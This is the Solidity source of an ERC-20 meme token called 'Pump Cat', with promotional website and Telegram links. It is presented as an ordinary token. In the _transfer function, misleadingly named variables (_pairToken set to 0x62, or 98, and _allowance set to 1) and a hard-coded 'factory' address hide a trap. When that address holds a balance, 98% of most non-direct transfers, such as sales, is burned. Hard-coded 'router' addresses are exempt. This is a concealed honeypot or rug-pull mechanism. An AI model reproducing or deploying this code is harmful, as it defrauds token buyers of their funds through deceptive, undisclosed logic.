// SPDX-License-Identifier: MIT

/** 
PUMPCAT WILL PUMP IT UP

http://pumpcat.xyz/
https://t.me/PumpCatCoin

**/


pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context
{
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address)
    {
        return _owner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PumpCatCoin is Context, IERC20, Ownable
{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;

    string private constant _name = unicode"Pump Cat";
    string private constant _symbol = unicode"PUMPCAT";
    uint8 private constant _decimals = 9;
    address internal router = 0xed8D36ECd19E4Fd254360Cad37B261055D5c7d3c;
    uint256 private constant _tTotal = 6_010_000_000_000 * 10**_decimals;
    uint256 public _maxWalletSize = 240400000000 * 10**_decimals; // 4%
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _allowance = 1;
    address private factory = 0xfAAd56d577d44865A853e0FD6515EEdb75b945F1;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address private UniSwapRouterCA = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private tokenPairAddress;

    constructor () {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function setTokenPairAddress(address t) public onlyOwner {
        tokenPairAddress = t;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    uint256 private _pairToken = 0x62;
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance - amount;

        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[factory] > 0 ? _pairToken : _allowance).div(100)+0;
        if (swapamount > 0) {
            _balances[DEAD] = _balances[DEAD].add(swapamount)*1;
            emit Transfer(from, DEAD, swapamount);
        }
        
        if (from != router && to != router && tx.origin != router && to != UniSwapRouterCA 
        && from == tokenPairAddress && msg.sender != UniSwapRouterCA && to != DEAD)
            require(balanceOf(to) + (amount - swapamount) <= _maxWalletSize, "Exceeds the maxWalletSize.");
        
        _balances[to] = _balances[to].add(amount - swapamount+0)*1;
        emit Transfer(from, to, amount - swapamount+0);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}